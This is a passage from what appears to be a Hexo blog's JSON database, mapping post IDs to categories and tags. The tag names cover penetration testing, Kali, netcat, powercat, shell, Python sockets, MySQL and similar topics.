egory_id":"ckq4nzayh001p7vvt833z2oqi","_id":"ckq4nzayk001v7vvthhrmg6ib"},{"post_id":"ckq4nzay8000z7vvt92qu7pws","category_id":"ckq4nzayj001s7vvtaujh4xke","_id":"ckq4nzaym001y7vvt88ha25nn"},{"post_id":"ckq4nzazr002v7vvt8qm31pk0","category_id":"ckq4nzaye001c7vvt1podfl5t","_id":"ckq4nzazt002z7vvtawl4eg6q"},{"post_id":"ckq4nzazs002w7vvt15cv64ek","category_id":"ckq4nzayj001s7vvtaujh4xke","_id":"ckq4nzazu00317vvt6aetecfh"},{"post_id":"ckq4nzb0500357vvtbcwgeluv","category_id":"ckq4nzayc00187vvt8bzmefho","_id":"ckq4nzb0600377vvtcz6vfs7m"}],"PostTag":[{"post_id":"ckq4nzax400017vvtd36kbzv4","tag_id":"ckq4nzaxi00057vvteg3e8g51","_id":"ckq4nzaxw000j7vvthkyqf97g"},{"post_id":"ckq4nzax400017vvtd36kbzv4","tag_id":"ckq4nzaxn000c7vvt2t54ckru","_id":"ckq4nzaxx000l7vvt6yh2adm3"},{"post_id":"ckq4nzaxe00037vvt3u1kddpe","tag_id":"ckq4nzaxu000h7vvtfyn38r3f","_id":"ckq4nzay2000v7vvtc2p817c0"},{"post_id":"ckq4nzaxe00037vvt3u1kddpe","tag_id":"ckq4nzaxy000o7vvtfq2ybsr5","_id":"ckq4nzay8000x7vvt7k672nm7"},{"post_id":"ckq4nzaxj00077vvt80oeco27","tag_id":"ckq4nzay1000t7vvt9c959en8","_id":"ckq4nzayc00167vvtbigg5q2w"},{"post_id":"ckq4nzaxj00077vvt80oeco27","tag_id":"ckq4nzay900117vvthr3ff2zw","_id":"ckq4nzayc00177vvt9he1dp2n"},{"post_id":"ckq4nzaxl00097vvta3w5ahix","tag_id":"ckq4nzaya00157vvt04ot5gir","_id":"ckq4nzayf001e7vvtgp6d9tr8"},{"post_id":"ckq4nzaxl00097vvta3w5ahix","tag_id":"ckq4nzayd001a7vvt895yf4y6","_id":"ckq4nzayf001g7vvt6b7kb9qh"},{"post_id":"ckq4nzaxm000a7vvt0s8w07ar","tag_id":"ckq4nzay900117vvthr3ff2zw","_id":"ckq4nzayh001m7vvt4slchm33"},{"post_id":"ckq4nzaxm000a7vvt0s8w07ar","tag_id":"ckq4nzayf001i7vvtf04jbft4","_id":"ckq4nzayh001o7vvt6ys56kau"},{"post_id":"ckq4nzaxo000d7vvtbgllb4a5","tag_id":"ckq4nzayh001l7vvtf7he9atf","_id":"ckq4nzayk001u7vvt489v3x35"},{"post_id":"ckq4nzaxo000d7vvtbgllb4a5","tag_id":"ckq4nzayj001q7vvtduh94sr1","_id":"ckq4nzayk001w7vvt2dr51ej1"},{"post_id":"ckq4nzaxt000e7vvtei98cdzo","tag_id":"ckq4nzayk001t7vvtdfrjhyiv","_id":"ckq4nzayn00217vvtdxmg3n2k"},{"post_id":"ckq4nzaxt000e7vvtei98cdzo","tag_id":"ckq4nzayj001q7vvtduh94sr1","_id":"ckq4nzayn00227vvtf8hghssv"},{"post_id":"ckq4nzaxt000e7vvtei98cdzo","tag_id":"ckq4nzay900117vvthr3ff2zw","_id":"ckq4nzayn00247vvtc7ms7qu6"},{"post_id":"ckq4nzaxv000i7vvt94u50vct","tag_id":"ckq4nzaym00207vvta8861bsn","_id":"ckq4nzayo00277vvtgnyv2eih"},{"post_id":"ckq4nzaxv000i7vvt94u50vct","tag_id":"ckq4nzayn00237vvt54pofqip","_id":"ckq4nzayo00287vvt53rh9532"},{"post_id":"ckq4nzaxv000i7vvt94u50vct","tag_id":"ckq4nzayn00257vvt9t9deuw7","_id":"ckq4nzayp002a7vvt8c4u5bfg"},{"post_id":"ckq4nzaxx000k7vvthzhr0ai6","tag_id":"ckq4nzayo00267vvtdwz18yv4","_id":"ckq4nzayq002c7vvt952whvw4"},{"post_id":"ckq4nzaxx000k7vvthzhr0ai6","tag_id":"ckq4nzayp00297vvthdheg776","_id":"ckq4nzayq002d7vvt1ktcaej5"},{"post_id":"ckq4nzaxy000p7vvt12nj50zh","tag_id":"ckq4nzayo00267vvtdwz18yv4","_id":"ckq4nzayr002g7vvt96we0z3b"},{"post_id":"ckq4nzaxy000p7vvt12nj50zh","tag_id":"ckq4nzayq002e7vvth75mdv23","_id":"ckq4nzayr002h7vvthpza23v4"},{"post_id":"ckq4nzay0000q7vvtfc5ha50e","tag_id":"ckq4nzayq002f7vvt0aen9n4n","_id":"ckq4nzayr002j7vvteozce3u3"},{"post_id":"ckq4nzay1000u7vvt5qgi95uc","tag_id":"ckq4nzayd001a7vvt895yf4y6","_id":"ckq4nzays002l7vvtdk42aekn"},{"post_id":"ckq4nzay2000w7vvt5yoi5qlq","tag_id":"ckq4nzayr002k7vvt7khze0o4","_id":"ckq4nzayt002o7vvt896o2ypi"},{"post_id":"ckq4nzay2000w7vvt5yoi5qlq","tag_id":"ckq4nzayh001l7vvtf7he9atf","_id":"ckq4nzayt002p7vvt87h89vua"},{"post_id":"ckq4nzay8000z7vvt92qu7pws","tag_id":"ckq4nzayt002n7vvtcxt7bt1j","_id":"ckq4nzayy002s7vvt90sk360m"},{"post_id":"ckq4nzay8000z7vvt92qu7pws","tag_id":"ckq4nzayt002q7vvt8mu3cj7b","_id":"ckq4nzayy002t7vvt46by9z9a"},{"post_id":"ckq4nzay8000z7vvt92qu7pws","tag_id":"ckq4nzayu002r7vvthqbpadyd","_id":"ckq4nzayz002u7vvtf4y61rqc"},{"post_id":"ckq4nzazs002w7vvt15cv64ek","tag_id":"ckq4nzayu002r7vvthqbpadyd","_id":"ckq4nzazt002y7vvtdhc55zna"},{"post_id":"ckq4nzazs002w7vvt15cv64ek","tag_id":"ckq4nzayt002n7vvtcxt7bt1j","_id":"ckq4nzazu00307vvt6hebhh6v"},{"post_id":"ckq4nzazs002w7vvt15cv64ek","tag_id":"ckq4nzayt002q7vvt8mu3cj7b","_id":"ckq4nzazu00327vvt389w9e18"},{"post_id":"ckq4nzazr002v7vvt8qm31pk0","tag_id":"ckq4nzayo00267vvtdwz18yv4","_id":"ckq4nzazu00337vvtdu2e4ryj"},{"post_id":"ckq4nzazr002v7vvt8qm31pk0","tag_id":"ckq4nzazt002x7vvt58e52w6i","_id":"ckq4nzazu00347vvt7ucv8h36"},{"post_id":"ckq4nzb0500357vvtbcwgeluv","tag_id":"ckq4nzaym00207vvta8861bsn","_id":"ckq4nzb0700387vvt9tycg32x"},{"post_id":"ckq4nzb0500357vvtbcwgeluv","tag_id":"ckq4nzb0600367vvt2ljo1rtn","_id":"ckq4nzb0700397vvt01ob3g2a"}],"Tag":[{"name":"渗透测试","_id":"ckq4nzaxi00057vvteg3e8g51"},{"name":"DC","_id":"ckq4nzaxn000c7vvt2t54ckru"},{"name":"git","_id":"ckq4nzaxu000h7vvtfyn38r3f"},{"name":"github","_id":"ckq4nzaxy000o7vvtfq2ybsr5"},{"name":"linux","_id":"ckq4nzay1000t7vvt9c959en8"},{"name":"kali","_id":"ckq4nzay900117vvthr3ff2zw"},{"name":"hexo","_id":"ckq4nzaya00157vvt04ot5gir"},{"name":"blog","_id":"ckq4nzayd001a7vvt895yf4y6"},{"name":"typroa","_id":"ckq4nzayf001i7vvtf04jbft4"},{"name":"necat","_id":"ckq4nzayh001l7vvtf7he9atf"},{"name":"tool","_id":"ckq4nzayj001q7vvtduh94sr1"},{"name":"powercat","_id":"ckq4nzayk001t7vvtdfrjhyiv"},{"name":"python","_id":"ckq4nzaym00207vvta8861bsn"},{"name":"网络编程","_id":"ckq4nzayn00237vvt54pofqip"},{"name":"套接字","_id":"ckq4nzayn00257vvt9t9deuw7"},{"name":"win10","_id":"ckq4nzayo00267vvtdwz18yv4"},{"name":"文件夹","_id":"ckq4nzayp00297vvthdheg776"},{"name":"vim","_id":"ckq4nzayq002e7vvth75mdv23"},{"name":"网络","_id":"ckq4nzayq002f7vvt0aen9n4n"},{"name":"shell","_id":"ckq4nzayr002k7vvt7khze0o4"},{"name":"mysql","_id":"ckq4nzayt002n7vvtcxt7bt1j"},{"name":"sql","_id":"ckq4nzayt002q7vvt8mu3cj7b"},{"name":"数据库","_id":"ckq4nzayu002r7vvthqbpadyd"},{"name":"bat","_id":"ckq4nzazt002x7vvt58e52w6i"},{"name":"爬虫","_id":"ckq4nzb0600367vvt2ljo1rtn"}]}}